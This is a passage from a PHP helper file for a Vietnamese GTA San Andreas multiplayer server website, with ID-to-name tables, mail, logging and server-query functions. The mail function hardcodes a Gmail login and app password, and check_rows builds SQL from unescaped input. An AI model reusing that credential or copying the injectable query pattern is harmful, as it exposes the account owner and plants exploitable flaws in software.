    $return = 'Flamethrower';
    } elseif ($id == 38) {
    $return = 'Minigun';
    } elseif ($id == 39) {
    $return = 'Satchel Charge';
    } elseif ($id == 40) {
    $return = 'Detonator';
    } elseif ($id == 41) {
    $return = 'Spraycan';
    } elseif ($id == 42) {
    $return = 'Fire Extinguisher';
    } elseif ($id == 43) {
    $return = 'Camera';
    } elseif ($id == 44) {
    $return = 'Night Vis Goggles';
    } elseif ($id == 45) {
    $return = 'Thermal Goggles';
    } elseif ($id == 46) {
    $return = 'Parachute';
    } elseif ($id == 47) {
    $return = 'Fake Pistol';
    } elseif ($id == 49) {
    $return = 'Vehicle';
    } elseif ($id == 50) {
    $return = 'Helicopter Blades';
    } elseif ($id == 51) {
    $return = 'Explosion';
    } elseif ($id == 53) {
    $return = 'Drowned';
    } elseif ($id == 54) {
    $return = 'Splat';
    } elseif ($id == 200) {
    $return = 'Connect';
    } elseif ($id == 201) {
    $return = 'Disconnect';
    } elseif ($id == 255) {
    $return = 'Suicide';
    } else {
    $return = 'No name';
    }
    return $return;
    }
    function getVehiclesName($id)
    {
    if ($id == 400) {
    $return = 'Landstalker';
    } elseif ($id == 401) {
    $return = 'Bravura';
    } elseif ($id == 402) {
    $return = 'Buffalo';
    } elseif ($id == 403) {
    $return = 'Linerunner';
    } elseif ($id == 405) {
    $return = 'Sentinel';
    } elseif ($id == 406) {
    $return = 'Dumper';
    } elseif ($id == 407) {
    $return = 'Firetruck';
    } elseif ($id == 408) {
    $return = 'Trashmaster';
    } elseif ($id == 409) {
    $return = 'Stretch';
    } elseif ($id == 410) {
    $return = 'Manana';
    } elseif ($id == 411) {
    $return = 'Infernus';
    } elseif ($id == 412) {
    $return = 'Voodoo';
    } elseif ($id == 413) {
    $return = 'Pony';
    } elseif ($id == 414) {
    $return = 'Mule';
    } elseif ($id == 415) {
    $return = 'Cheetah';
    } elseif ($id == 416) {
    $return = 'Ambulance';
    } elseif ($id == 417) {
    $return = 'Leviathan';
    } elseif ($id == 418) {
    $return = 'Moonbeam';
    } elseif ($id == 419) {
    $return = 'Esperanto';
    } elseif ($id == 420) {
    $return = 'Taxi';
    } elseif ($id == 421) {
    $return = 'Washington';
    } elseif ($id == 422) {
    $return = 'Bobcat';
    } elseif ($id == 423) {
    $return = 'Whoopee';
    } elseif ($id == 424) {
    $return = 'BF Injection';
    } elseif ($id == 425) {
    $return = 'Hunter';
    } elseif ($id == 426) {
    $return = 'Premier';
    } elseif ($id == 427) {
    $return = 'Enforcer';
    } elseif ($id == 428) {
    $return = 'Securicar';
    } elseif ($id == 429) {
    $return = 'Banshee';
    } elseif ($id == 430) {
    $return = 'Predator';
    } elseif ($id == 431) {
    $return = 'Bus';
    } elseif ($id == 432) {
    $return = 'Rhino';
    } elseif ($id == 433) {
    $return = 'Barracks';
    } elseif ($id == 434) {
    $return = 'Hotknife';
    } elseif ($id == 435) {
    $return = 'Article Trailer';
    } elseif ($id == 436) {
    $return = 'Previon';
    } elseif ($id == 437) {
    $return = 'Coach';
    } elseif ($id == 438) {
    $return = 'Cabbie';
    } elseif ($id == 439) {
    $return = 'Stallion';
    } elseif ($id == 440) {
    $return = 'Rumpo';
    } elseif ($id == 441) {
    $return = 'RC Bandit';
    } elseif ($id == 442) {
    $return = 'Romero';
    } elseif ($id == 443) {
    $return = 'Packer';
    } elseif ($id == 444) {
    $return = 'Monster';
    } elseif ($id == 445) {
    $return = 'Admiral';
    } elseif ($id == 446) {
    $return = 'Squallo';
    } elseif ($id == 447) {
    $return = 'Seasparrow';
    } elseif ($id == 448) {
    $return = 'Pizzaboy';
    } elseif ($id == 449) {
    $return = 'Tram';
    } elseif ($id == 450) {
    $return = 'Article Trailer 2';
    } elseif ($id == 451) {
    $return = 'Turismo';
    } elseif ($id == 452) {
    $return = 'Speeder';
    } elseif ($id == 453) {
    $return = 'Reefer';
    } elseif ($id == 454) {
    $return = 'Tropic';
    } elseif ($id == 455) {
    $return = 'Flatbed';
    } elseif ($id == 456) {
    $return = 'Yankee';
    } elseif ($id == 457) {
    $return = 'Caddy';
    } elseif ($id == 458) {
    $return = 'Solair';
    } elseif ($id == 459) {
    $return = 'Topfun Van ';
    } elseif ($id == 460) {
    $return = 'Skimmer';
    } elseif ($id == 461) {
    $return = 'PCJ-600';
    } elseif ($id == 462) {
    $return = 'Faggio';
    } elseif ($id == 463) {
    $return = 'Freeway';
    } elseif ($id == 464) {
    $return = 'RC Baron';
    } elseif ($id == 465) {
    $return = 'RC Raider';
    } elseif ($id == 466) {
    $return = 'Glendale';
    } elseif ($id == 467) {
    $return = 'Oceanic';
    } elseif ($id == 468) {
    $return = 'Sanchez';
    } elseif ($id == 469) {
    $return = 'Sparrow';
    } elseif ($id == 470) {
    $return = 'Patriot';
    } elseif ($id == 471) {
    $return = 'Quad';
    } elseif ($id == 472) {
    $return = 'Coastguard';
    } elseif ($id == 473) {
    $return = 'Dinghy';
    } elseif ($id == 474) {
    $return = 'Hermes';
    } elseif ($id == 475) {
    $return = 'Sabre';
    } elseif ($id == 476) {
    $return = 'Rustler';
    } elseif ($id == 477) {
    $return = 'ZR-350';
    } elseif ($id == 478) {
    $return = 'Walton';
    } elseif ($id == 479) {
    $return = 'Regina';
    } elseif ($id == 480) {
    $return = 'Comet';
    } elseif ($id == 481) {
    $return = 'BMX';
    } elseif ($id == 482) {
    $return = 'Burrito';
    } elseif ($id == 483) {
    $return = 'Camper';
    } elseif ($id == 484) {
    $return = 'Marquis';
    } elseif ($id == 485) {
    $return = 'Baggage';
    } elseif ($id == 486) {
    $return = 'Dozer';
    } elseif ($id == 487) {
    $return = 'Maverick';
    } elseif ($id == 488) {
    $return = 'SAN News ';
    } elseif ($id == 489) {
    $return = 'Rancher';
    } elseif ($id == 490) {
    $return = 'FBI Rancher';
    } elseif ($id == 491) {
    $return = 'Virgo';
    } elseif ($id == 492) {
    $return = 'Greenwood';
    } elseif ($id == 493) {
    $return = 'Jetmax';
    } elseif ($id == 494) {
    $return = 'Hotring Racer';
    } elseif ($id == 495) {
    $return = 'Sandking';
    } elseif ($id == 496) {
    $return = 'Blista Compact';
    } elseif ($id == 497) {
    $return = 'Police Maverick';
    } elseif ($id == 498) {
    $return = 'Boxville';
    } elseif ($id == 499) {
    $return = 'Benson';
    } elseif ($id == 500) {
    $return = 'Mesa';
    } elseif ($id == 501) {
    $return = 'RC Goblin';
    } elseif ($id == 502) {
    $return = 'Hotring Racer A';
    } elseif ($id == 503) {
    $return = 'Hotring Racer B';
    } elseif ($id == 504) {
    $return = 'Bloodring Banger';
    } elseif ($id == 505) {
    $return = 'Rancher Lure';
    } elseif ($id == 506) {
    $return = 'Super GT';
    } elseif ($id == 507) {
    $return = 'Elegant';
    } elseif ($id == 508) {
    $return = 'Journey';
    } elseif ($id == 509) {
    $return = 'Bike';
    } elseif ($id == 510) {
    $return = 'Mountain Bike';
    } elseif ($id == 511) {
    $return = 'Beagle';
    } elseif ($id == 512) {
    $return = 'Cropduster';
    } elseif ($id == 513) {
    $return = 'Stuntplane';
    } elseif ($id == 514) {
    $return = 'Tanker';
    } elseif ($id == 515) {
    $return = 'Roadtrain';
    } elseif ($id == 516) {
    $return = 'Nebula';
    } elseif ($id == 517) {
    $return = 'Majestic';
    } elseif ($id == 518) {
    $return = 'Buccaneer';
    } elseif ($id == 519) {
    $return = 'Shamal';
    } elseif ($id == 520) {
    $return = 'Hydra';
    } elseif ($id == 521) {
    $return = 'FCR-900';
    } elseif ($id == 522) {
    $return = 'NRG-500';
    } elseif ($id == 523) {
    $return = 'HPV1000';
    } elseif ($id == 524) {
    $return = 'Cement Truck';
    } elseif ($id == 525) {
    $return = 'Towtruck';
    } elseif ($id == 526) {
    $return = 'Fortune';
    } elseif ($id == 527) {
    $return = 'Cadrona';
    } elseif ($id == 528) {
    $return = ' FBI Truck';
    } elseif ($id == 529) {
    $return = 'Willard';
    } elseif ($id == 530) {
    $return = 'Forklift';
    } elseif ($id == 531) {
    $return = 'Tractor';
    } elseif ($id == 532) {
    $return = 'Combine Harvester';
    } elseif ($id == 533) {
    $return = 'Feltzer';
    } elseif ($id == 534) {
    $return = 'Remington';
    } elseif ($id == 535) {
    $return = 'Slamvan';
    } elseif ($id == 536) {
    $return = 'Blade';
    } elseif ($id == 537) {
    $return = 'Freight';
    } elseif ($id == 538) {
    $return = 'Brownstreak ';
    } elseif ($id == 539) {
    $return = 'Vortex';
    } elseif ($id == 540) {
    $return = 'Vincent';
    } elseif ($id == 541) {
    $return = 'Bullet';
    } elseif ($id == 542) {
    $return = 'Clover';
    } elseif ($id == 543) {
    $return = 'Sadler';
    } elseif ($id == 544) {
    $return = 'Firetruck LA';
    } elseif ($id == 545) {
    $return = 'Hustler';
    } elseif ($id == 546) {
    $return = 'Intruder';
    } elseif ($id == 547) {
    $return = 'Primo';
    } elseif ($id == 548) {
    $return = 'Cargobob';
    } elseif ($id == 549) {
    $return = 'Tampa';
    } elseif ($id == 550) {
    $return = 'Sunrise';
    } elseif ($id == 551) {
    $return = 'Merit';
    } elseif ($id == 552) {
    $return = 'Utility Van';
    } elseif ($id == 553) {
    $return = 'Nevada';
    } elseif ($id == 554) {
    $return = 'Yosemite';
    } elseif ($id == 555) {
    $return = 'Windsor';
    } elseif ($id == 556) {
    $return = 'Monster "A"';
    } elseif ($id == 557) {
    $return = 'Monster "B"';
    } elseif ($id == 558) {
    $return = 'Uranus';
    } elseif ($id == 559) {
    $return = 'Jester';
    } elseif ($id == 560) {
    $return = 'Sultan';
    } elseif ($id == 561) {
    $return = 'Stratum';
    } elseif ($id == 562) {
    $return = 'Elegy';
    } elseif ($id == 563) {
    $return = 'Raindance';
    } elseif ($id == 564) {
    $return = 'RC Tiger';
    } elseif ($id == 565) {
    $return = 'Flash';
    } elseif ($id == 566) {
    $return = 'Tahoma';
    } elseif ($id == 567) {
    $return = 'Savanna';
    } elseif ($id == 568) {
    $return = 'Bandito';
    } elseif ($id == 569) {
    $return = 'Freight Flat Trailer ';
    } elseif ($id == 570) {
    $return = 'StreakTrailer';
    } elseif ($id == 571) {
    $return = 'Kart';
    } elseif ($id == 572) {
    $return = 'Mower';
    } elseif ($id == 573) {
    $return = 'Dune ';
    } elseif ($id == 574) {
    $return = 'Sweeper ';
    } elseif ($id == 575) {
    $return = 'Broadway';
    } elseif ($id == 576) {
    $return = 'Tornado';
    } elseif ($id == 577) {
    $return = 'AT400';
    } elseif ($id == 578) {
    $return = 'DFT-30';
    } elseif ($id == 579) {
    $return = 'Huntley';
    } elseif ($id == 580) {
    $return = 'Stafford ';
    } elseif ($id == 581) {
    $return = 'BF-400';
    } elseif ($id == 582) {
    $return = 'Newsvan';
    } elseif ($id == 583) {
    $return = 'Tug';
    } elseif ($id == 584) {
    $return = 'Petrol Trailer';
    } elseif ($id == 585) {
    $return = 'Emperor';
    } elseif ($id == 586) {
    $return = 'Wayfarer';
    } elseif ($id == 587) {
    $return = 'Euros';
    } elseif ($id == 588) {
    $return = 'Hotdog';
    } elseif ($id == 589) {
    $return = 'Club';
    } elseif ($id == 590) {
    $return = 'Freight Box Trailer';
    } elseif ($id == 591) {
    $return = 'Article Trailer 3';
    } elseif ($id == 592) {
    $return = 'Andromada';
    } elseif ($id == 593) {
    $return = 'Dodo';
    } elseif ($id == 594) {
    $return = 'RC Cam';
    } elseif ($id == 595) {
    $return = 'Launch';
    } elseif ($id == 596) {
    $return = 'Police Car (LSPD)';
    } elseif ($id == 597) {
    $return = 'Police Car (SFPD)';
    } elseif ($id == 598) {
    $return = 'Police Car (LVPD)';
    } elseif ($id == 599) {
    $return = 'Police Ranger';
    } elseif ($id == 600) {
    $return = 'Picador';
    } elseif ($id == 601) {
    $return = 'S.W.A.T';
    } elseif ($id == 602) {
    $return = 'Alpha';
    } elseif ($id == 603) {
    $return = 'Phoenix';
    } elseif ($id == 604) {
    $return = 'Glendale Shit';
    } elseif ($id == 605) {
    $return = 'Sadler Shit';
    } elseif ($id == 606) {
    $return = 'Baggage Trailer "A"';
    } elseif ($id == 607) {
    $return = 'Baggage Trailer "B"';
    } elseif ($id == 608) {
    $return = 'Tug Stairs Trailer';
    } elseif ($id == 609) {
    $return = 'Boxville';
    } elseif ($id == 610) {
    $return = 'Farm Trailer';
    } elseif ($id == 611) {
    $return = 'Utility Trailer';
    } else {
    $return = 'No Name';
    }
    return $return;
    }
    function sendCSM($mail_nhan, $ten_nhan, $chu_de, $noi_dung)
    {
    $mail = new PHPMailer();
    $smtp = new SMTP();
    $mail->isSMTP(); //Send using SMTP
    $mail->Host = 'tls://smtp.gmail.com'; //Set the SMTP server to send through
    // $mail->SMTPDebug = SMTP::DEBUG_LOWLEVEL;
    $mail->SMTPAuth = true; //Enable SMTP authentication
    $mail->Username = 'gsampvn@gmail.com'; //SMTP username
    $mail->Password = 'marappikswzuiczz'; //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS; //Enable implicit TLS encryption
    $mail->Port = 587; //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('gsampvn@gmail.com', "Máy chủ Gta Samp Mobile");
    $mail->addAddress($mail_nhan, $ten_nhan); //Add a recipient
    $mail->addReplyTo('gsampvn@gmail.com', 'Not Reply'); // nay edit duoc chu
    $mail->addCC($mail_nhan);

    //Content
    $mail->isHTML(true); //Set email format to HTML
    $mail->Subject = $chu_de;
    $mail->Body = $noi_dung;
    $mail->CharSet = 'UTF-8';
    $send = $mail->send();
    return $send;
    }

    function GetFactionType($data)
    {
    if ($data == 1) {
    $show = 'Cảnh Sát';
    }
    if ($data == 2) {
    $show = 'Bác Sĩ';
    }
    if ($data == 3) {
    $show = 'Toà Soạn';
    }
    if ($data == 4) {
    $show = 'Chính Phủ';
    }
    if ($data == 5) {
    $show = 'Hitman';
    }
    if ($data == 6) {
    $show = 'Liên Bang';
    }
    if ($data == 7) {
    $show = 'Thợ Sửa Xe';
    }
    return $show;
    }

    function getVehiclesType($type)
    {
    if ($type == "car") {
    return "Xe oto";
    }
    if ($type == "moto") {
    return "Xe moto";
    }
    if ($type == "maybay") {
    return "Máy bay";
    }
    if ($type == "tauthuyen") {
    return "Tàu thuyền";
    }
    }

    $knsite = $KNCMS->query("SELECT * FROM `kncms_settings`")->fetch_array();

    $token = $knsite['TokenMomo'];

    function KNCMS_Log($text, $uid)
    {
    $KNCMS = new KNCMS;
    date_default_timezone_set('Asia/Ho_Chi_Minh');
    $timezz = date('d-m-Y h:i:z');
    $text = $KNCMS->anti_text($text);
    return $KNCMS->query("INSERT INTO `kncms_log` SET
    `log` = '$text',
    `uid` = '$uid',
    `time` = '$timezz'
    ");
    UTF8Encodez($text);
    }

    function check_rows($data, $table, $field)
    {
    $KNCMS = new KNCMS;

    $querycheck = $KNCMS->query("SELECT * FROM `$table` WHERE `$field` = '$data'");
    if ($querycheck->num_rows > 0) return true;
    else return false;
    }
    function GetCardStatus($status)
    {
    if ($status == 1) return 'Thẻ thành công đúng mệnh giá';
    if ($status == 2) return 'Thẻ thành công sai mệnh giá';
    if ($status == 3) return 'Thẻ lỗi';
    if ($status == 4) return 'Hệ thống bảo trì';
    if ($status == 99) return 'Thẻ chờ xử lý';
    }
    function GetServerCard($serverid)
    {
    if ($serverid == 1) return "https://thesieure.com/";
    else if ($serverid == 2) return "https://www.doithe1s.vn/";
    else if ($serverid == 3) return "https://trannga.vn/";
    else return "https://www.doithe1s.vn/";
    }
    function hUrl($url)
    {
    global $base_url;
    $new_url = $strTitle = str_replace("//", "/", $url);
    $new_url = $base_url . $url;
    return $new_url;
    }
    function CheckOnline()
    {
    global $user_ss;
    if($user_ss['Online'] == 1) return true;
    else return false;
    }
    function VaildEmail()
    {
    global $user_ss;
    if($user_ss['active_status'] != 1) return false;
    else return true;
    }
    function VaildAccount()
    {
    global $user_ss;
    if($user_ss['Registered']) return false;
    else return true;
    }

    function KNCMS_SAMPQuery($ipz, $portz)
    {
    if (filter_var(gethostbyname($ipz), FILTER_VALIDATE_IP)) {
    $query = new SampQueryAPI(gethostbyname($ipz), $portz);
    $info = $query->getInfo();
    if($query->isOnline()) $state = 'Online';
    else $state = 'Offline';
    if($query->isOnline()) $info_arr = array('ServerName' => $info['hostname'], 'State' => $state, 'Player' => $info['players'], 'Gamemode' => $info['gamemode'], 'MapName' => $info['mapname'], 'MaxPlayer' => $info['maxplayers']);
    else $info_arr = array('ServerName' => 'NULL', 'State' => 'Offline', 'Player' => '0', 'Gamemode' => 'NULL', 'MapName' => 'NULL','MaxPlayer' => '1000');
    }
    else $info_arr = array('ServerName' => 'NULL', 'State' => 'Offline', 'Player' => '0', 'Gamemode' => 'NULL', 'MapName' => 'NULL','MaxPlayer' => '1000');
    return $info_arr;
    }